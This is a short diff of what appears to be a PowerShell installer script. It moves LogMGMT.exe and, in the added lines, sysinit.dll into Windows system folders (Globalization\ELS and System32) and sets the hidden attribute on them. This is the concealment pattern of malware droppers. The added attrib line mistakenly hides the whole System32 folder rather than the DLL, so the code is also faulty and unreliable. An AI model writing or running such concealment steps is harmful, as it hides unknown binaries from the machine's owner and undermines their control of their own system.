@@ -58,3 +58,9 @@ move $logmgmtLoc C:\Windows\Globalization\ELS
 # Hide LogMGMT.exe
 attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe
 
+# Find sysinit.dll
+$sysinitLoc = Get-ChildItem sysinit.dll
+# Move sysinit.dll
+move $sysinitLoc C:\Windows\System32
+# Hide sysinit.dll
+attrib +h C:\windows\System32
